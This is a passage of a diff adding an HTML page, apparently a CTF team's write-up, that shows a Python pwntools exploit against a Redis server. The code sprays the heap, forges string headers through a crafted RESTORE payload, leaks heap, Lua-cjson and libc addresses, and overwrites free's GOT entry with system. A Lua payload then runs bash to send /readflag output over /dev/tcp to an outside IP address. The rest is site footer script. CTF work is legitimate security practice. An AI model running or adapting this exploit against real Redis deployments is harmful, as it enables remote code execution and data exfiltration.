+    <span class="n">rem_port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">())</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"got remote port: %d"</span><span class="p">,</span> <span class="n">rem_port</span><span class="p">)</span>
+    <span class="n">r_host</span> <span class="o">=</span> <span class="n">host</span>
+    <span class="c1"># io.interactive()
+</span><span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.0</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+    <span class="n">r_host</span> <span class="o">=</span> <span class="s">"localhost"</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="p">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">r_host</span><span class="p">,</span> <span class="n">rem_port</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">fake_sdshdr8</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+    <span class="mi">0</span><span class="p">:</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xff</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="bp">False</span><span class="p">),</span>
+    <span class="mi">1</span><span class="p">:</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xff</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="bp">False</span><span class="p">),</span>
+    <span class="mi">2</span><span class="p">:</span> <span class="n">p8</span><span class="p">(</span><span class="n">SDS_TYPE_8</span><span class="p">)</span>
+<span class="p">})</span>
+
+<span class="c1"># create two strings
+</span><span class="n">str_pay</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">12</span><span class="p">):</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"spr</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="mi">02</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="nb">set</span><span class="p">(</span><span class="sa">f</span><span class="s">"spray</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">name</span> <span class="o">+</span> <span class="n">fake_sdshdr8</span> <span class="o">+</span> <span class="n">str_pay</span><span class="p">[:</span><span class="o">-</span><span class="mi">8</span><span class="p">])</span>
+
+<span class="n">myis</span> <span class="o">=</span> <span class="n">intset</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+<span class="n">rdb</span> <span class="o">=</span> <span class="n">RDB</span><span class="p">(</span><span class="n">RDB_TYPE_SET_INTSET</span><span class="p">)</span>
+<span class="n">rdb</span><span class="p">.</span><span class="n">append_bs</span><span class="p">(</span><span class="n">myis</span><span class="p">)</span>
+<span class="n">dumped</span> <span class="o">=</span> <span class="n">encode_dump</span><span class="p">(</span><span class="n">rdb</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sprayed!"</span><span class="p">)</span>
+
+<span class="c1"># pause()
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">delete</span><span class="p">(</span><span class="s">"spray5"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"deleted spray5"</span><span class="p">)</span>
+
+<span class="c1"># pause()
+</span>
+<span class="c1"># time.sleep(1.0)
+</span><span class="n">r</span><span class="p">.</span><span class="n">memory_purge</span><span class="p">()</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"purged memory"</span><span class="p">)</span>
+<span class="c1"># pause()
+</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">restore</span><span class="p">(</span><span class="s">"lmao"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dumped</span><span class="p">)</span>
+
+<span class="c1"># time.sleep(0.5)
+# r.set("a", str_pay)
+# time.sleep(0.5)
+# r.set("b", str_pay)
+# time.sleep(0.5)
+</span>
+<span class="k">def</span> <span class="nf">dec_elem</span><span class="p">(</span><span class="n">elem</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">elem</span><span class="p">.</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span>
+
+<span class="n">elems</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">sscan</span><span class="p">(</span><span class="s">"lmao"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">elems</span> <span class="o">=</span> <span class="n">elems</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="n">elems</span><span class="p">)</span>
+<span class="c1"># spray6_addr = dec_elem(elems[8])
+</span>
+<span class="c1"># log.info("spray6 @ 0x%x", spray6_addr)
+</span>
+<span class="n">del_target</span> <span class="o">=</span> <span class="n">dec_elem</span><span class="p">(</span><span class="n">elems</span><span class="p">[</span><span class="mi">7</span><span class="p">])</span>
+
+<span class="c1"># pause()
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">srem</span><span class="p">(</span><span class="s">"lmao"</span><span class="p">,</span> <span class="n">del_target</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">set_bytes</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">bs</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">off</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">setrange</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">bs</span><span class="p">)</span>
+    <span class="n">curr</span> <span class="o">=</span> <span class="n">off</span><span class="o">*</span><span class="mi">8</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bs</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+            <span class="n">bit</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">7</span> <span class="o">-</span> <span class="n">i</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mi">1</span>
+            <span class="n">r</span><span class="p">.</span><span class="n">setbit</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">curr</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">bit</span><span class="p">)</span>
+        <span class="n">curr</span> <span class="o">+=</span> <span class="mi">8</span>
+
+<span class="k">def</span> <span class="nf">get_bytes</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">off</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">getrange</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">off</span><span class="o">+</span><span class="n">size</span><span class="p">)</span>
+    <span class="n">base</span> <span class="o">=</span> <span class="n">off</span><span class="o">*</span><span class="mi">8</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+            <span class="n">bit</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">getbit</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="n">k</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+            <span class="n">b</span> <span class="o">|=</span> <span class="p">(</span><span class="n">bit</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">7</span> <span class="o">-</span> <span class="n">i</span><span class="p">))</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">b</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="c1"># pause()
+</span>
+<span class="c1"># res = r.get("spray6")
+</span>
+<span class="c1"># print(hexdump(res))
+</span>
+<span class="c1"># sp7_obj = res[0x2d:]
+</span>
+<span class="n">sp7_cont_off</span> <span class="o">=</span> <span class="mh">0x40</span>
+
+<span class="c1"># print(hexdump(sp7_obj))
+</span>
+<span class="c1"># typ_enc_lru = u32(sp7_obj[:4])
+# refcount = u32(sp7_obj[4:8])
+# ptr = u64(sp7_obj[8:16])
+</span>
+<span class="c1"># sp7_addr = ptr - 3 - 0x10
+</span>
+<span class="c1"># we want large one
+# fake_sp7_shdr_addr = sp7_addr + 0x10 + 0x17
+</span>
+<span class="n">uint64_max</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+
+<span class="n">fake_sdshdr64</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+        <span class="c1"># fake sdshdr64
+</span>        <span class="mi">0</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">uint64_max</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="bp">False</span><span class="p">),</span>
+        <span class="mi">8</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">uint64_max</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="bp">False</span><span class="p">),</span>
+        <span class="mi">16</span><span class="p">:</span> <span class="n">p8</span><span class="p">(</span><span class="n">SDS_TYPE_64</span><span class="p">)</span>
+<span class="p">})</span>
+
+
+<span class="c1"># fake_sp7 = flat({
+#     0: p32(typ_enc_lru),
+#     4: p32(refcount),
+#     8: p64(fake_sp7_shdr_addr),
+#     16: fake_sdshdr64
+# })
+</span>
+<span class="c1"># set_bytes("spray6", fake_sp7, 0x2d)
+</span><span class="n">set_bytes</span><span class="p">(</span><span class="s">"spray6"</span><span class="p">,</span> <span class="n">fake_sdshdr64</span><span class="p">,</span> <span class="n">sp7_cont_off</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_sdshdr64</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"faked spray7"</span><span class="p">)</span>
+
+<span class="c1"># res = r.get("spray6")
+</span>
+<span class="c1"># sp7_obj = res[0x2d:]
+</span>
+<span class="c1"># print(hexdump(sp7_obj))
+</span>
+<span class="c1"># pause()
+</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x3</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="nb">set</span><span class="p">(</span><span class="sa">f</span><span class="s">"ssmall</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">44</span><span class="p">))</span>
+
+<span class="c1"># r.delete("spray8")
+# r.delete("spray9")
+</span>
+<span class="c1"># lua_pay = """
+# return tostring(cjson.encode)
+# end
+</span>
+<span class="c1"># arr = {}
+# _G["lmao"] = arr
+</span>
+<span class="c1"># function tricked()
+# """
+</span>
+<span class="c1"># print(r.eval(lua_pay, 0))
+</span>
+<span class="c1"># r.delete("spray10")
+</span>
+<span class="c1"># lua_pay = """
+# return _G["lmao"]
+# end
+</span>
+<span class="c1"># _G["lmao"][1] = 0
+</span>
+<span class="c1"># function tricked2()
+# """
+</span>
+<span class="c1"># print(r.eval(lua_pay, 0))
+</span>
+<span class="c1"># pause()
+</span>
+<span class="c1"># lua_pay = """
+# return _G["lmao"]
+# end
+</span>
+<span class="c1"># _G["lmao"][2] = 156842099844.517639160156250000000000000000
+</span>
+<span class="c1"># function tricked2()
+# """
+</span>
+<span class="c1"># print(r.eval(lua_pay, 0))
+</span>
+<span class="c1"># pause()
+</span>
+
+<span class="n">liblua_off</span> <span class="o">=</span> <span class="mh">0x200</span><span class="o">-</span><span class="mi">3</span> <span class="o">+</span> <span class="mh">0x07a0</span>
+
+<span class="c1"># useful_ptr_off = 0x02b0-3
+</span><span class="n">useful_ptr_off</span> <span class="o">=</span> <span class="mh">0x105</span>
+
+<span class="n">res</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">getrange</span><span class="p">(</span><span class="s">"spray7"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">hexdump</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
+
+<span class="n">res</span> <span class="o">=</span> <span class="n">get_bytes</span><span class="p">(</span><span class="s">"spray7"</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">useful_ptr_off</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">hexdump</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
+
+<span class="n">useful_ptr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">res</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"useful_ptr = 0x%x"</span><span class="p">,</span> <span class="n">useful_ptr</span><span class="p">)</span>
+<span class="n">sp7_addr</span> <span class="o">=</span> <span class="n">useful_ptr</span> <span class="o">-</span> <span class="p">(</span><span class="n">useful_ptr_off</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"s7 @ 0x%x"</span><span class="p">,</span> <span class="n">sp7_addr</span><span class="p">)</span>
+
+<span class="n">heap_base</span> <span class="o">=</span> <span class="n">sp7_addr</span> <span class="o">-</span> <span class="mh">0x7ffff66ed183</span> <span class="o">+</span> <span class="mh">0x00007ffff6200000</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">sp7_addr</span> <span class="o">-</span> <span class="mh">0xcd9103</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"heap @ 0x%x"</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">)</span>
+
+<span class="n">lua_state_off</span> <span class="o">=</span> <span class="mh">0x00007ffff66b1000</span><span class="o">-</span><span class="mh">0x7ffff66ed183</span>
+<span class="n">lua_state_addr</span> <span class="o">=</span> <span class="n">sp7_addr</span> <span class="o">+</span> <span class="n">lua_state_off</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"lua_state @ 0x%x"</span><span class="p">,</span> <span class="n">lua_state_addr</span><span class="p">)</span>
+
+<span class="n">conn_off</span> <span class="o">=</span> <span class="mh">0x00007ffff66edf40</span> <span class="o">-</span> <span class="mh">0x7ffff66ed183</span>
+<span class="n">conn_addr</span> <span class="o">=</span> <span class="n">sp7_addr</span> <span class="o">+</span> <span class="n">conn_off</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"conn @ 0x%x"</span><span class="p">,</span> <span class="n">conn_addr</span><span class="p">)</span>
+
+
+<span class="n">fake_vtable_off</span> <span class="o">=</span> <span class="mh">0x20</span>
+<span class="n">fake_vtable_addr</span> <span class="o">=</span> <span class="n">sp7_addr</span> <span class="o">+</span> <span class="n">fake_vtable_off</span>
+<span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+    <span class="mi">0</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">),</span>
+    <span class="mi">8</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x42424242</span><span class="p">),</span>
+    <span class="mi">16</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x43434343</span><span class="p">)</span>
+<span class="p">})</span>
+
+<span class="c1"># set_bytes("spray7", fake_vtable, fake_vtable_off)
+</span>
+<span class="n">liblua</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"liblua-cjson.so"</span><span class="p">)</span>
+
+<span class="c1"># lua_pay = """
+# local arr = {}
+# arr[1] = cjson.json_encode
+# return arr
+# """
+</span>
+<span class="c1"># print(r.eval(lua_pay, 0))
+</span>
+<span class="c1"># lua_pay = """
+# local arr = {}
+# arr[1] = cjson.json_encode
+# arr[2] = cjson.json_encode
+# return arr
+# """
+</span>
+<span class="c1"># print(r.eval(lua_pay, 0))
+</span>
+<span class="c1"># lua_pay = """
+# local arr = {}
+# arr[1] = cjson.json_encode
+# arr[2] = cjson.json_encode
+# arr[3] = cjson.json_encode
+# return arr
+# """
+</span>
+<span class="c1"># print(r.eval(lua_pay, 0))
+</span>
+<span class="n">lua_pay</span> <span class="o">=</span> <span class="s">"""
+return tostring(cjson.encode)
+"""</span>
+
+<span class="n">res</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="n">lua_pay</span><span class="p">,</span> <span class="mi">0</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+
+<span class="c1"># pause()
+</span>
+<span class="c1"># res = get_bytes("spray7", 0x8000, 0)
+# print(hexdump(p64(liblua.symbols["json_encode"])))
+# print(hexdump(res))
+</span>
+<span class="n">enc_fn</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"function: "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">json_encode_addr_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">enc_fn</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mh">0x20</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"json_encode_addr_addr = 0x%x"</span><span class="p">,</span> <span class="n">json_encode_addr_addr</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"off = 0x%x"</span><span class="p">,</span>  <span class="n">json_encode_addr_addr</span> <span class="o">-</span> <span class="n">sp7_addr</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">get_bytes</span><span class="p">(</span><span class="s">"spray7"</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">json_encode_addr_addr</span> <span class="o">-</span> <span class="n">sp7_addr</span><span class="p">)</span>
+<span class="n">json_encode_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">res</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"json_encode_addr = 0x%x"</span><span class="p">,</span> <span class="n">json_encode_addr</span><span class="p">)</span>
+
+<span class="n">liblua</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">liblua_json_addr</span> <span class="o">=</span> <span class="n">json_encode_addr</span> <span class="o">-</span> <span class="n">liblua</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"json_encode"</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"liblua_json @ 0x%x"</span><span class="p">,</span> <span class="n">liblua_json_addr</span><span class="p">)</span>
+
+<span class="n">free_got</span> <span class="o">=</span> <span class="n">liblua</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"free"</span><span class="p">]</span>
+
+<span class="n">free_sp7_off</span> <span class="o">=</span> <span class="n">free_got</span> <span class="o">-</span> <span class="n">sp7_addr</span>
+
+<span class="n">snprintf_off</span> <span class="o">=</span> <span class="n">liblua</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"__snprintf_chk"</span><span class="p">]</span> <span class="o">-</span> <span class="n">sp7_addr</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"off = 0x%x"</span><span class="p">)</span>
+
+<span class="n">fputc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">get_bytes</span><span class="p">(</span><span class="s">"spray7"</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">snprintf_off</span><span class="p">)[:</span><span class="mi">8</span><span class="p">])</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fputc_addr = 0x%x"</span><span class="p">,</span> <span class="n">fputc_addr</span><span class="p">)</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">=</span> <span class="n">fputc_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__snprintf_chk"</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc @ 0x%x"</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">)</span>
+
+<span class="n">set_bytes</span><span class="p">(</span><span class="s">"spray7"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]),</span> <span class="n">free_sp7_off</span><span class="p">)</span>
+<span class="c1"># fake_conn = flat({
+</span>
+<span class="c1"># })
+</span>
+<span class="c1"># r.setrange("spray7", conn_off+0x30, cyclic(0x40))
+</span>
+<span class="c1"># set_bytes("spray7", b"b"*8, liblua_off - 0x20)
+# set_bytes("spray7", p64(0x414141414141), liblua_off)
+</span>
+<span class="c1"># pause()
+</span>
+<span class="n">lua_pay</span> <span class="o">=</span> <span class="s">"""
+return cjson.decode("</span><span class="se">\\</span><span class="s">"/bin/bash -c </span><span class="se">\\\\\\</span><span class="s">"/readflag &gt; /dev/tcp/84.72.193.30/1334</span><span class="se">\\\\\\</span><span class="s">"</span><span class="se">\\</span><span class="s">"")
+"""</span>
+
+<span class="c1"># pause()
+</span>
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="n">lua_pay</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+
+<span class="c1"># res = get_bytes("spray7", 0x300)
+# print(hexdump(res))
+</span>
+<span class="c1"># res = get_bytes("spray6", 0x60)
+# print(res)
+</span>
+<span class="c1"># shellcode = asm(shellcraft.sh())
+# payload = fit({
+#     32: 0xdeadbeef,
+#     'iaaa': [1, 2, 'Hello', 3]
+# }, length=128)
+# io.send(payload)
+# flag = io.recv(...)
+# log.success(flag)
+</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
